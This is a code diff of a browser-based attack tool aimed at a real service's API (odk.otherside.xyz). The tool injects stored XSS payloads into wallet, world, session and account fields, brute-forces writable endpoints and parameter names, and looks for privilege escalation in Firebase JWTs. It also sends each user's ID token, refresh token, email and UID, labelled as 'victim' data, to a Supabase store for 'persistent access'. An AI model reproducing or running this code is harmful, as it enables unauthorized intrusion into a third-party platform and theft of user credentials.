+                        log('xssLog', `[DOM] When ODK dashboard reads these localStorage values, XSS may trigger.`, 'info');
+                        log('xssLog', `[DOM] Visit https://odk.otherside.xyz/ to test.`, 'warning');
+                    }
+                },
+                {
+                    name: 'Template injection via API response',
+                    desc: 'Check if API responses with XSS are rendered client-side',
+                    test: async () => {
+                        // Fetch current user data and check if displayName is reflected
+                        const resp = await apiFetch('accounts/users/current');
+                        if (resp && resp.ok) {
+                            const data = await resp.json();
+                            log('xssLog', `[DOM] Current user data: ${JSON.stringify(data).substring(0, 200)}`, 'data');
+                            log('xssLog', `[DOM] If displayName is rendered as HTML in the dashboard, stored XSS works.`, 'warning');
+                        }
+
+                        // Check org data
+                        const orgResp = await apiFetch('organizations/current');
+                        if (orgResp && orgResp.ok) {
+                            const orgData = await orgResp.json();
+                            log('xssLog', `[DOM] Org data: ${JSON.stringify(orgData).substring(0, 200)}`, 'data');
+                        }
+                    }
+                },
+            ];
+
+            for (const test of domTests) {
+                log('xssLog', `[DOM] ${test.name}: ${test.desc}`, 'info');
+                try {
+                    await test.test();
+                } catch(e) {
+                    log('xssLog', `[DOM] Error: ${e.message}`, 'error');
+                }
+                await new Promise(r => setTimeout(r, 500));
+            }
+
+            log('xssLog', '[DOM XSS] Tests complete. Check results above.', 'success');
         }
 
         // =====================================================
         // TEST API CONNECTION
         // =====================================================
         async function testAPIConnection() {
-            log('xssLog', '[TEST] Testing API connectivity via proxy...', 'info');
+            log('xssLog', '[TEST] Testing API connectivity...', 'info');
 
-            // Test 1: GET without auth via direct fetch
+            // Test 1: GET without auth
             log('xssLog', '[TEST] 1. GET /organizations/current (no auth)...', 'info');
             try {
                 const resp = await fetch(`${API}/organizations/current`);
                 if (resp.ok) {
                     const data = await resp.json();
-                    log('xssLog', `[TEST] Direct GET OK! Org: ${data.name}`, 'success');
+                    log('xssLog', `[TEST] Direct GET OK! Org: ${data.name || JSON.stringify(data).substring(0, 60)}`, 'success');
+                } else {
+                    log('xssLog', `[TEST] Direct GET status: ${resp.status}`, 'warning');
                 }
             } catch(e) {
                 log('xssLog', `[TEST] Direct GET error: ${e.message}`, 'warning');
             }
 
             // Test 2: GET with auth via proxy
-            if (!idToken) {
-                log('xssLog', '[TEST] 2. SKIPPED - Not authenticated yet', 'warning');
-            } else {
+            if (idToken) {
                 log('xssLog', `[TEST] 2. Proxy GET /organizations/projects...`, 'info');
                 try {
                     const resp = await proxyFetch('organizations/projects', { method: 'GET' });
                     log('xssLog', `[TEST] Proxy GET status: ${resp.status}`, resp.ok ? 'success' : 'warning');
                     if (resp.ok) {
                         const data = await resp.json();
-                        log('xssLog', `[TEST] Proxy GET works! Data: ${JSON.stringify(data).substring(0, 80)}...`, 'success');
+                        log('xssLog', `[TEST] Proxy GET works! Data: ${JSON.stringify(data).substring(0, 80)}`, 'success');
                     }
                 } catch(e) {
                     log('xssLog', `[TEST] Proxy GET error: ${e.message}`, 'error');
                 }
-            }
 
-            // Test 3: POST with auth via proxy (the important one!)
-            if (idToken) {
-                log('xssLog', '[TEST] 3. Proxy POST /organizations/projects (with auth)...', 'info');
+                // Test 3: POST with auth
+                log('xssLog', `[TEST] 3. Proxy POST /organizations/projects (with auth)...`, 'info');
                 try {
                     const resp = await apiWrite('organizations/projects', 'POST',
                         JSON.stringify({ name: 'connection_test', description: 'test' }));
                     log('xssLog', `[TEST] Proxy POST status: ${resp.status}`, resp.ok ? 'success' : 'warning');
-                    if (resp.ok) {
-                        const data = await resp.json();
-                        log('xssLog', `[TEST] Proxy POST works! Created: ${JSON.stringify(data).substring(0, 80)}`, 'success');
-                    } else {
+                    if (!resp.ok) {
                         const errText = await resp.text();
-                        log('xssLog', `[TEST] Proxy POST response: ${resp.status} ${errText.substring(0, 80)}`, 'warning');
+                        log('xssLog', `[TEST] POST response: ${resp.status} ${errText.substring(0, 60)}`, 'warning');
                         if (resp.status === 403) {
-                            log('xssLog', `[TEST] 403 = User lacks write permission. Trying other endpoints...`, 'warning');
-                            // Try alternative endpoints
-                            await testWritableEndpoints();
+                            log('xssLog', `[TEST] 403 = No write permission. Try Reflected XSS or Privilege Escalation.`, 'warning');
                         }
                     }
                 } catch(e) {
@@ -1141,42 +1490,8 @@
             log('xssLog', '[TEST] Connection test complete.', 'info');
         }
 
-        async function testWritableEndpoints() {
-            const endpoints = [
-                { ep: 'organizations/projects', method: 'POST', body: { name: 'test', description: 'test' } },
-                { ep: 'organizations/current', method: 'PATCH', body: { name: 'test' } },
-                { ep: 'accounts/users/current', method: 'PATCH', body: { displayName: 'test' } },
-                { ep: 'organizations/apiKeys', method: 'POST', body: { displayName: 'test' } },
-                { ep: 'worlds', method: 'POST', body: { name: 'test', description: 'test' } },
-                { ep: 'wallet/nonce', method: 'POST', body: { evmWalletAddress: '0x0000000000000000000000000000000000000000' } },
-                { ep: 'wallet/verify/signin', method: 'POST', body: { evmWalletAddress: '0x0000000000000000000000000000000000000000' } },
-                { ep: 'sessions', method: 'POST', body: {} },
-                { ep: 'organizations/projects', method: 'PUT', body: { name: 'test' } },
-            ];
-
-            for (const e of endpoints) {
-                try {
-                    const resp = await apiWrite(e.ep, e.method, JSON.stringify(e.body));
-                    const label = `${e.method} /${e.ep}`;
-                    if (resp.ok) {
-                        log('xssLog', `[+] ${label}: ${resp.status} - WRITABLE!`, 'success');
-                    } else if (resp.status === 400) {
-                        log('xssLog', `[?] ${label}: 400 - EXISTS but wrong params (might be writable!)`, 'warning');
-                    } else if (resp.status === 403) {
-                        log('xssLog', `[-] ${label}: 403 - Forbidden`, 'error');
-                    } else if (resp.status === 401) {
-                        log('xssLog', `[-] ${label}: 401 - Auth issue`, 'error');
-                    } else {
-                        log('xssLog', `[?] ${label}: ${resp.status}`, 'warning');
-                    }
-                } catch(e) {
-                    log('xssLog', `[!] ${e.method} /${e.ep}: ${e.message}`, 'error');
-                }
-            }
-        }
-
         // =====================================================
-        // INJECT XSS PAYLOAD
+        // STORED XSS INJECTION (still available if permissions change)
         // =====================================================
         async function injectXSS() {
             if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
@@ -1184,9 +1499,8 @@
             const customPayload = document.getElementById('xssCustomPayload').value.trim();
             const payload = customPayload || XSS_PAYLOADS[selectedPayload].payload;
             const target = document.getElementById('xssTarget').value;
-            const projectId = document.getElementById('xssProjectId').value;
 
-            log('xssLog', `[XSS] Injecting payload into ${target}...`, 'info');
+            log('xssLog', `[XSS] Injecting into ${target}...`, 'info');
             log('xssLog', `[XSS] Payload: ${payload.substring(0, 80)}...`, 'data');
 
             let endpoint, method, body;
@@ -1195,14 +1509,12 @@
                 case 'wallet-nonce':
                     endpoint = 'wallet/nonce';
                     method = 'POST';
-                    // /wallet/nonce returns 200 - inject XSS in evmWalletAddress field
                     body = JSON.stringify({ evmWalletAddress: payload });
                     break;
                 case 'world-create':
                     endpoint = 'worlds';
                     method = 'POST';
-                    // Try multiple field formats for /worlds (returns 400 with simple params)
-                    body = JSON.stringify({ name: payload, description: 'New World', worldName: payload, title: payload });
+                    body = JSON.stringify({ name: payload, description: 'New World' });
                     break;
                 case 'wallet-signin':
                     endpoint = 'wallet/verify/signin';
@@ -1212,7 +1524,7 @@
                 case 'sessions':
                     endpoint = 'sessions';
                     method = 'POST';
-                    body = JSON.stringify({ name: payload, sessionName: payload, displayName: payload });
+                    body = JSON.stringify({ name: payload });
                     break;
                 case 'project':
                     endpoint = 'organizations/projects';
@@ -1234,11 +1546,6 @@
                     method = 'POST';
                     body = JSON.stringify({ displayName: payload });
                     break;
-                case 'world-update':
-                    endpoint = `worlds/${projectId}`;
-                    method = 'PATCH';
-                    body = JSON.stringify({ name: payload });
-                    break;
                 case 'custom':
                     endpoint = document.getElementById('xssCustomEndpoint').value;
                     method = 'POST';
@@ -1251,7 +1558,7 @@
 
                 if (resp.ok) {
                     const data = await resp.json();
-                    log('xssLog', `[+] XSS INJECTED successfully! Status: ${resp.status}`, 'success');
+                    log('xssLog', `[+] XSS INJECTED! Status: ${resp.status}`, 'success');
                     log('xssLog', `[+] Response: ${JSON.stringify(data).substring(0, 150)}`, 'data');
                     xssInjected++;
 
@@ -1262,85 +1569,42 @@
                         id_token: idToken,
                         xss_target: `${method} ${API}/${endpoint}`,
                         xss_payload: payload,
-                        notes: `Stored XSS injected into ${target}. Payload will execute when admin views it.`
+                        notes: `Stored XSS injected into ${target}.`
                     });
-
                 } else {
                     const errText = await resp.text();
-                    log('xssLog', `[-] Injection failed: ${resp.status} ${errText.substring(0, 100)}`, 'error');
-                    if (resp.status === 400 || resp.status === 422) {
-                        log('xssLog', `[RETRY] Trying alternative field names...`, 'warning');
-                        await tryAlternativeFields(endpoint, method, payload);
-                    } else if (resp.status === 403) {
-                        log('xssLog', `[-] 403 = No write permission on this endpoint. Try another!`, 'warning');
+                    log('xssLog', `[-] Failed: ${resp.status} ${errText.substring(0, 80)}`, 'error');
+                    if (resp.status === 403) {
+                        log('xssLog', `[-] 403 = No write permission. Try "Reflected XSS" or "Privilege Escalation" tabs.`, 'warning');
                     }
                 }
             } catch(e) {
-                log('xssLog', `[!] Request error: ${e.message}`, 'error');
+                log('xssLog', `[!] Error: ${e.message}`, 'error');
             }
             updateStats();
         }
 
-        async function tryAlternativeFields(endpoint, method, payload) {
-            const fieldVariants = [
-                { name: payload },
-                { displayName: payload },
-                { title: payload },
-                { description: payload },
-                { label: payload },
-                { value: payload },
-                { content: payload },
-                { text: payload },
-                { metadata: { name: payload } },
-                { settings: { displayName: payload } },
-                { name: payload, description: payload },
-            ];
-
-            for (const body of fieldVariants) {
-                try {
-                    const resp = await apiWrite(endpoint, method, JSON.stringify(body));
-
-                    if (resp.ok) {
-                        const data = await resp.json();
-                        log('xssLog', `[+] ALT FIELD SUCCESS: ${JSON.stringify(Object.keys(body))} → ${resp.status}`, 'success');
-                        xssInjected++;
-
-                        await saveToSupabase({
-                            attack_type: 'xss_injection_alt',
-                            victim_email: currentUser?.email || '',
-                            victim_uid: currentUser?.uid || '',
-                            id_token: idToken,
-                            xss_target: `${method} ${API}/${endpoint}`,
-                            xss_payload: payload,
-                            notes: `Stored XSS via alt field: ${JSON.stringify(Object.keys(body))}`
-                        });
-                        break;
-                    }
-                } catch(e) {}
-                await new Promise(r => setTimeout(r, 100));
-            }
-        }
-
         async function injectAllPayloads() {
             if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('xssLog', '[XSS] Injecting ALL payloads - prioritizing WRITABLE endpoints...', 'warning');
+            log('xssLog', '[XSS] Injecting ALL payloads - trying ALL endpoints...', 'warning');
 
-            // Prioritize writable endpoints first!
             const injectionTargets = [
-                { endpoint: 'wallet/nonce', method: 'POST', field: 'evmWalletAddress', desc: 'Wallet Nonce [200!]', priority: true },
-                { endpoint: 'worlds', method: 'POST', field: 'name', desc: 'Create World [400]', priority: true },
-                { endpoint: 'wallet/verify/signin', method: 'POST', field: 'evmWalletAddress', desc: 'Wallet Sign-In [400]', priority: true },
-                { endpoint: 'sessions', method: 'POST', field: 'name', desc: 'Sessions [400]', priority: true },
-                { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Create Project [403]', priority: false },
-                { endpoint: 'organizations/current', method: 'PATCH', field: 'name', desc: 'Update Org Name [403]', priority: false },
-                { endpoint: 'accounts/users/current', method: 'PATCH', field: 'displayName', desc: 'Update User DisplayName [403]', priority: false },
-                { endpoint: 'organizations/apiKeys', method: 'POST', field: 'displayName', desc: 'Create API Key [403]', priority: false },
+                { endpoint: 'wallet/nonce', method: 'POST', field: 'evmWalletAddress', desc: 'Wallet Nonce' },
+                { endpoint: 'worlds', method: 'POST', field: 'name', desc: 'Create World' },
+                { endpoint: 'wallet/verify/signin', method: 'POST', field: 'evmWalletAddress', desc: 'Wallet Sign-In' },
+                { endpoint: 'sessions', method: 'POST', field: 'name', desc: 'Sessions' },
+                { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Create Project' },
+                { endpoint: 'organizations/current', method: 'PATCH', field: 'name', desc: 'Update Org' },
+                { endpoint: 'accounts/users/current', method: 'PATCH', field: 'displayName', desc: 'Update User' },
+                { endpoint: 'organizations/apiKeys', method: 'POST', field: 'displayName', desc: 'Create API Key' },
             ];
+
+            let successCount = 0;
 
             for (let i = 0; i < XSS_PAYLOADS.length; i++) {
                 const p = XSS_PAYLOADS[i];
                 const target = injectionTargets[i % injectionTargets.length];
-                log('xssLog', `[${i+1}/${XSS_PAYLOADS.length}] ${p.name} → ${target.desc}...`, 'info');
+                log('xssLog', `[${i+1}/${XSS_PAYLOADS.length}] ${p.name} -> ${target.desc}...`, 'info');
 
                 try {
                     const bodyObj = {};
@@ -1351,6 +1615,7 @@
 
                     if (resp.ok) {
                         log('xssLog', `[+] ${p.name}: INJECTED into ${target.desc}!`, 'success');
+                        successCount++;
                         xssInjected++;
 
                         await saveToSupabase({
@@ -1360,132 +1625,58 @@
                             id_token: idToken,
                             xss_target: `${target.method} ${API}/${target.endpoint}`,
                             xss_payload: p.payload,
-                            notes: `Bulk XSS: ${p.name} (${p.tag}) into ${target.desc}`
+                            notes: `Bulk XSS: ${p.name} into ${target.desc}`
                         });
                     } else {
                         const status = resp.status;
-                        const errText = await resp.text();
-                        log('xssLog', `[-] ${p.name}: Failed (${status}) ${errText.substring(0, 60)}`, 'error');
-
-                        if (status === 400 || status === 422) {
-                            log('xssLog', `[RETRY] Trying alt fields...`, 'warning');
-                            await tryAlternativeFields(target.endpoint, target.method, p.payload);
+                        if (status === 403) {
+                            log('xssLog', `[-] ${p.name}: 403 Forbidden (no write permission)`, 'error');
+                        } else {
+                            const errText = await resp.text();
+                            log('xssLog', `[-] ${p.name}: ${status} ${errText.substring(0, 40)}`, 'error');
                         }
                     }
                 } catch(e) {
                     log('xssLog', `[!] ${p.name}: Error - ${e.message}`, 'error');
                 }
-                await new Promise(r => setTimeout(r, 300));
+                await new Promise(r => setTimeout(r, 200));
             }
 
-            log('xssLog', `[DONE] All payloads injected. Total: ${xssInjected}`, 'success');
+            if (successCount === 0) {
+                log('xssLog', `[DONE] All payloads failed (403). Current token lacks write permissions.`, 'warning');
+                log('xssLog', `[HINT] Try: (1) Reflected XSS tab, (2) Privilege Escalation tab, (3) Get admin token`, 'warning');
+            } else {
+                log('xssLog', `[DONE] ${successCount} payloads injected successfully!`, 'success');
+            }
             updateStats();
         }
 
-        async function testXSSReflection() {
-            if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
-
-            const testPayload = '<img src=x onerror="window.__xss_test=true">';
-            log('xssLog', '[TEST] Testing XSS reflection with harmless payload...', 'info');
-
-            const testTargets = [
-                { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Project Name' },
-                { endpoint: 'accounts/users/current', method: 'PATCH', field: 'displayName', desc: 'User DisplayName' },
-                { endpoint: 'organizations/apiKeys', method: 'POST', field: 'displayName', desc: 'API Key Name' },
-            ];
-
-            for (const t of testTargets) {
-                log('xssLog', `[TEST] Trying ${t.desc}...`, 'info');
-                try {
-                    const bodyObj = {};
-                    bodyObj[t.field] = testPayload;
-                    if (t.method === 'POST') bodyObj.description = 'XSS Test';
-
-                    const resp = await apiWrite(t.endpoint, t.method, JSON.stringify(bodyObj));
-
-                    if (resp.ok) {
-                        const data = await resp.json();
-                        log('xssLog', `[+] ${t.desc}: CREATED! Check if reflected as HTML.`, 'success');
-                        log('xssLog', `[+] Response: ${JSON.stringify(data).substring(0, 150)}`, 'data');
-
-                        await saveToSupabase({
-                            attack_type: 'xss_reflection_test',
-                            victim_email: currentUser?.email || '',
-                            victim_uid: currentUser?.uid || '',
-                            id_token: idToken,
-                            xss_target: `${t.method} ${API}/${t.endpoint}`,
-                            xss_payload: testPayload,
-                            notes: `XSS reflection test: ${t.desc}`
-                        });
-                    } else {
-                        const errText = await resp.text();
-                        log('xssLog', `[-] ${t.desc}: Failed (${resp.status}) ${errText.substring(0, 60)}`, 'error');
-                    }
-                } catch(e) {
-                    log('xssLog', `[!] ${t.desc}: Error - ${e.message}`, 'error');
-                }
-            }
-
-            log('xssLog', '[TEST] Open https://odk.otherside.xyz/dashboard to check if HTML renders!', 'warning');
-        }
-        // =====================================================
-        // PARAMETER DISCOVERY - Brute-force body formats
-        // for endpoints that return 400 (wrong params)
-        // =====================================================
         async function discoverParams() {
             if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('xssLog', '[DISCOVER] Brute-forcing parameter names for 400 endpoints...', 'warning');
+            log('xssLog', '[DISCOVER] Testing parameter combinations for 400 endpoints...', 'warning');
 
-            const endpoints400 = [
-                { ep: 'worlds', method: 'POST', desc: 'Create World' },
-                { ep: 'wallet/verify/signin', method: 'POST', desc: 'Wallet Sign-In' },
-                { ep: 'sessions', method: 'POST', desc: 'Sessions' },
-            ];
-
-            // Common field names that APIs might accept
             const fieldCombos = [
-                // Worlds endpoints
-                { ep: 'worlds', bodies: [
-                    { name: 'test' },
-                    { worldName: 'test' },
-                    { title: 'test' },
-                    { name: 'test', description: 'test' },
-                    { worldName: 'test', description: 'test' },
-                    { name: 'test', type: 'public' },
-                    { name: 'test', visibility: 'public' },
-                    { name: 'test', category: 'general' },
-                    { name: 'test', tags: ['test'] },
-                    { name: 'test', worldId: '1' },
-                    { worldId: 'test', name: 'test' },
-                    { id: '1', name: 'test' },
-                    { slug: 'test', name: 'test' },
-                    { name: 'test', status: 'active' },
-                    { name: 'test', ownerId: '1' },
-                    { name: 'test', configuration: {} },
+                { ep: 'worlds', method: 'POST', bodies: [
+                    { name: 'test' }, { worldName: 'test' }, { title: 'test' },
+                    { name: 'test', description: 'test' }, { name: 'test', type: 'public' },
+                    { name: 'test', visibility: 'public' }, { name: 'test', category: 'general' },
+                    { name: 'test', tags: ['test'] }, { name: 'test', worldId: '1' },
+                    { id: '1', name: 'test' }, { slug: 'test', name: 'test' },
                 ]},
-                // Wallet verify/signin
-                { ep: 'wallet/verify/signin', bodies: [
+                { ep: 'wallet/nonce', method: 'POST', bodies: [
                     { evmWalletAddress: '0x0000000000000000000000000000000000000001' },
                     { walletAddress: '0x0000000000000000000000000000000000000001' },
                     { address: '0x0000000000000000000000000000000000000001' },
+                ]},
+                { ep: 'wallet/verify/signin', method: 'POST', bodies: [
                     { evmWalletAddress: '0x0000000000000000000000000000000000000001', signature: '0x00' },
                     { evmWalletAddress: '0x0000000000000000000000000000000000000001', nonce: '1' },
                     { evmWalletAddress: '0x0000000000000000000000000000000000000001', message: 'test' },
-                    { evmWalletAddress: '0x0000000000000000000000000000000000000001', signedMessage: '0x00' },
                 ]},
-                // Sessions
-                { ep: 'sessions', bodies: [
-                    { name: 'test' },
-                    { sessionName: 'test' },
-                    { sessionId: '1' },
-                    { type: 'streaming' },
-                    { worldId: '1' },
-                    { projectId: '1' },
-                    { userId: '1' },
-                    { name: 'test', duration: 60 },
-                    { name: 'test', status: 'active' },
-                    { name: 'test', worldId: '1' },
-                    { configuration: { quality: 'high' } },
+                { ep: 'sessions', method: 'POST', bodies: [
+                    { name: 'test' }, { sessionName: 'test' }, { sessionId: '1' },
+                    { type: 'streaming' }, { worldId: '1' }, { projectId: '1' },
+                    { name: 'test', worldId: '1' }, { configuration: { quality: 'high' } },
                 ]},
             ];
 
@@ -1494,13 +1685,13 @@
 
                 for (const body of combo.bodies) {
                     try {
-                        const resp = await apiWrite(combo.ep, 'POST', JSON.stringify(body));
+                        const resp = await apiWrite(combo.ep, combo.method, JSON.stringify(body));
                         const label = JSON.stringify(Object.keys(body));
 
-                        if (resp.ok) {
+                        if (resp.ok || resp.status === 201) {
                             const data = await resp.json();
-                            log('xssLog', `[+] ${combo.ep} SUCCESS with ${label}! Status: ${resp.status}`, 'success');
-                            log('xssLog', `[+] Response: ${JSON.stringify(data).substring(0, 150)}`, 'data');
+                            log('xssLog', `[+] ${combo.ep} SUCCESS with ${label}!`, 'success');
+                            xssInjected++;
 
                             await saveToSupabase({
                                 attack_type: 'param_discovery',
@@ -1509,37 +1700,745 @@
                                 id_token: idToken,
                                 xss_target: `POST ${API}/${combo.ep}`,
                                 xss_payload: label,
-                                notes: `Found working params for ${combo.ep}: ${label}. Response: ${JSON.stringify(data).substring(0, 200)}`
+                                notes: `Found working params for ${combo.ep}: ${label}`
                             });
-
-                            xssInjected++;
                         } else if (resp.status === 400) {
                             const errText = await resp.text();
-                            // Check if error message reveals expected field names
-                            if (errText.includes('required') || errText.includes('field') || errText.includes('parameter') || errText.includes('missing')) {
-                                log('xssLog', `[HINT] ${combo.ep} ${label}: 400 - ${errText.substring(0, 120)}`, 'warning');
+                            if (errText.includes('required') || errText.includes('field') || errText.includes('missing')) {
+                                log('xssLog', `[HINT] ${combo.ep} ${label}: 400 - ${errText.substring(0, 100)}`, 'warning');
                             } else {
                                 log('xssLog', `[-] ${combo.ep} ${label}: 400`, 'error');
                             }
                         } else if (resp.status === 403) {
                             log('xssLog', `[-] ${combo.ep} ${label}: 403 (no permission)`, 'error');
-                        } else if (resp.status === 201) {
-                            log('xssLog', `[+] ${combo.ep} CREATED with ${label}! Status: 201`, 'success');
-                            xssInjected++;
-                        } else {
-                            log('xssLog', `[?] ${combo.ep} ${label}: ${resp.status}`, 'warning');
                         }
-                    } catch(e) {
-                        log('xssLog', `[!] ${combo.ep} ${label}: ${e.message}`, 'error');
-                    }
-                    await new Promise(r => setTimeout(r, 200));
+                    } catch(e) {}
+                    await new Promise(r => setTimeout(r, 100));
                 }
             }
 
-            log('xssLog', `[DISCOVER] Parameter discovery complete. Found ${xssInjected} working combinations.`, 'success');
+            log('xssLog', '[DISCOVER] Parameter discovery complete.', 'info');
             updateStats();
         }
 
+        // =====================================================
+        // TOKEN ANALYZER
+        // =====================================================
+        function base64UrlDecode(str) {
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            while (str.length % 4) str += '=';
+            try {
+                return decodeURIComponent(atob(str).split('').map(c =>
+                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
+                ).join(''));
+            } catch(e) {
+                return atob(str);
+            }
+        }
+
+        function analyzeToken() {
+            const el = document.getElementById('tokenAnalysis');
+            if (!idToken) {
+                el.innerHTML = '<span class="jwt-warn">[ERROR] No token available. Authenticate first.</span>';
+                return;
+            }
+
+            const parts = idToken.split('.');
+            if (parts.length !== 3) {
+                el.innerHTML = '<span class="jwt-warn">[ERROR] Invalid JWT format.</span>';
+                return;
+            }
+
+            let header, payload;
+            try {
+                header = JSON.parse(base64UrlDecode(parts[0]));
+            } catch(e) {
+                header = { error: 'Failed to decode header' };
+            }
+            try {
+                payload = JSON.parse(base64UrlDecode(parts[1]));
+            } catch(e) {
+                payload = { error: 'Failed to decode payload' };
+            }
+
+            const now = Math.floor(Date.now() / 1000);
+            const exp = payload.exp || 0;
+            const iat = payload.iat || 0;
+            const isExpired = now > exp;
+            const timeLeft = exp - now;
+
+            let html = '';
+            html += '<div style="margin-bottom:12px;padding:8px;background:#1a1030;border-radius:6px;">';
+            html += '<span class="jwt-field">JWT Header:</span>\n';
+            html += `<span class="jwt-value">${JSON.stringify(header, null, 2)}</span>`;
+            html += '</div>';
+
+            html += '<div style="margin-bottom:12px;padding:8px;background:#1a1030;border-radius:6px;">';
+            html += '<span class="jwt-field">JWT Payload:</span>\n';
+            html += `<span class="jwt-value">${JSON.stringify(payload, null, 2)}</span>`;
+            html += '</div>';
+
+            // Security analysis
+            html += '<div style="padding:8px;background:#0a1a0a;border-radius:6px;border:1px solid #14532d;">';
+            html += '<span class="jwt-field">Security Analysis:</span>\n\n';
+
+            // Expiration
+            if (isExpired) {
+                html += `<span class="jwt-warn">[!] TOKEN EXPIRED</span> (expired ${Math.abs(timeLeft)}s ago)\n`;
+            } else {
+                html += `<span class="jwt-ok">[OK] Token valid</span> (expires in ${timeLeft}s / ${Math.round(timeLeft/60)}min)\n`;
+            }
+
+            // Issued at
+            if (iat) {
+                html += `<span class="jwt-value">Issued: ${new Date(iat * 1000).toISOString()}</span>\n`;
+                html += `<span class="jwt-value">Expires: ${new Date(exp * 1000).toISOString()}</span>\n`;
+            }
+
+            // Algorithm
+            html += `\n<span class="jwt-field">Algorithm:</span> <span class="jwt-value">${header.alg || 'unknown'}</span>`;
+            if (header.alg === 'RS256') {
+                html += ' <span class="jwt-ok">[OK] RSA signature (secure)</span>';
+            } else if (header.alg === 'HS256') {
+                html += ' <span class="jwt-warn">[!] HMAC - might be vulnerable to algorithm confusion</span>';
+            } else if (header.alg === 'none') {
+                html += ' <span class="jwt-warn">[!!!] CRITICAL: No signature! Algorithm "none" - can be forged!</span>';
+            }
+
+            // Custom claims
+            html += '\n\n<span class="jwt-field">Custom Claims / Roles:</span>\n';
+            const roleClaims = ['role', 'roles', 'admin', 'is_admin', 'permissions', 'scope', 'custom:role', 'custom:permissions', 'claims', 'auth_time', 'firebase'];
+            let foundClaims = false;
+            for (const claim of roleClaims) {
+                if (payload[claim] !== undefined) {
+                    html += `  <span class="jwt-field">${claim}:</span> <span class="jwt-value">${JSON.stringify(payload[claim])}</span>\n`;
+                    foundClaims = true;
+                }
+            }
+            if (payload.firebase) {
+                html += `  <span class="jwt-field">firebase.sign_in_provider:</span> <span class="jwt-value">${payload.firebase.sign_in_provider || 'N/A'}</span>\n`;
+                html += `  <span class="jwt-field">firebase.tenant:</span> <span class="jwt-value">${payload.firebase.tenant || 'N/A'}</span>\n`;
+                if (payload.firebase.identities) {
+                    html += `  <span class="jwt-field">firebase.identities:</span> <span class="jwt-value">${JSON.stringify(payload.firebase.identities)}</span>\n`;
+                }
+                foundClaims = true;
+            }
+            if (!foundClaims) {
+                html += '  <span class="jwt-warn">No custom role/permission claims found in token.</span>\n';
+                html += '  <span class="jwt-warn">This means authorization is likely checked server-side (not in JWT).</span>\n';
+            }
+
+            // Privilege escalation hints
+            html += '\n<span class="jwt-field">Privilege Escalation Opportunities:</span>\n';
+            if (!payload.role && !payload.admin && !payload.is_admin) {
+                html += '  <span class="jwt-warn">[!] No role claim in JWT - authorization is server-side only.</span>\n';
+                html += '  <span class="jwt-value">  Try: (1) API endpoint role manipulation, (2) Organization admin takeover</span>\n';
+            }
+            if (payload.firebase?.sign_in_provider === 'google.com') {
+                html += '  <span class="jwt-value">[INFO] Google OAuth sign-in - no password needed for token refresh.</span>\n';
+            }
+            if (exp - iat > 3600) {
+                html += `  <span class="jwt-warn">[!] Long-lived token: ${(exp-iat)/3600} hours. Good for persistent access.</span>\n`;
+            }
+
+            html += '</div>';
+
+            el.innerHTML = html;
+
+            // Save token analysis to Supabase
+            saveToSupabase({
+                attack_type: 'token_analysis',
+                victim_email: currentUser?.email || '',
+                victim_uid: currentUser?.uid || '',
+                id_token: idToken,
+                notes: `JWT Analysis: alg=${header.alg}, exp=${isExpired ? 'expired' : 'valid'}, claims=${Object.keys(payload).join(',')}`
+            });
+        }
+
+        async function checkTokenRefresh() {
+            const el = document.getElementById('tokenAnalysis');
+            if (!currentUser) {
+                el.innerHTML += '\n<span class="jwt-warn">[ERROR] Not authenticated.</span>';
+                return;
+            }
+
+            el.innerHTML += '\n\n<div style="margin-top:12px;padding:8px;background:#1a1030;border-radius:6px;">';
+            el.innerHTML += '<span class="jwt-field">Token Refresh Test:</span>\n';
+
+            try {
+                const oldToken = idToken;
+                const newToken = await currentUser.getIdToken(true); // Force refresh
+                idToken = newToken;
+
+                if (oldToken !== newToken) {
+                    el.innerHTML += '<span class="jwt-ok">[OK] Token refresh successful! New token obtained.</span>\n';
+                    el.innerHTML += `<span class="jwt-value">New token: ${newToken.substring(0, 30)}...</span>\n`;
+                } else {
+                    el.innerHTML += '<span class="jwt-warn">[!] Same token returned after refresh (cached?)</span>\n';
+                }
+
+                // Check refresh token
+                if (refreshToken) {
+                    el.innerHTML += `<span class="jwt-ok">[OK] Refresh token available (${refreshToken.substring(0, 20)}...)</span>\n`;
+                    el.innerHTML += '<span class="jwt-value">Refresh tokens can be used server-side to get new ID tokens indefinitely.</span>\n';
+                }
+
+                await saveToSupabase({
+                    attack_type: 'token_refresh',
+                    victim_email: currentUser?.email || '',
+                    victim_uid: currentUser?.uid || '',
+                    id_token: newToken,
+                    refresh_token: refreshToken,
+                    notes: `Token refresh test: success, new token obtained`
+                });
+
+            } catch(e) {
+                el.innerHTML += `<span class="jwt-warn">[ERROR] Token refresh failed: ${e.message}</span>\n`;
+            }
+
+            el.innerHTML += '</div>';
+        }
+
+        async function testCustomToken() {
+            const el = document.getElementById('tokenAnalysis');
+            el.innerHTML += '\n\n<div style="margin-top:12px;padding:8px;background:#1a1030;border-radius:6px;">';
+            el.innerHTML += '<span class="jwt-field">Custom Token Test:</span>\n';
+            el.innerHTML += '<span class="jwt-value">Testing if Firebase custom tokens can mint admin tokens...</span>\n';
+
+            // Try to sign in with a custom token (would need server-side generation)
+            try {
+                // Check if the Firebase project allows custom token authentication
+                const testResp = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${firebaseConfig.apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: 'test',
+                        returnSecureToken: true
+                    })
+                });
+
+                const result = await testResp.json();
+                if (result.error) {
+                    el.innerHTML += `<span class="jwt-ok">[OK] Custom token auth rejected: ${result.error.message}</span>\n`;
+                } else {
+                    el.innerHTML += `<span class="jwt-warn">[!] Custom token auth might work! Check response.</span>\n`;
+                }
+            } catch(e) {
+                el.innerHTML += `<span class="jwt-value">Custom token test error: ${e.message}</span>\n`;
+            }
+
+            el.innerHTML += '</div>';
+        }
+
+        // =====================================================
+        // SECURITY HEADERS CHECK
+        // =====================================================
+        async function checkSecurityHeaders() {
+            log('headersLog', '[HEADERS] Checking security headers on ODK API...', 'info');
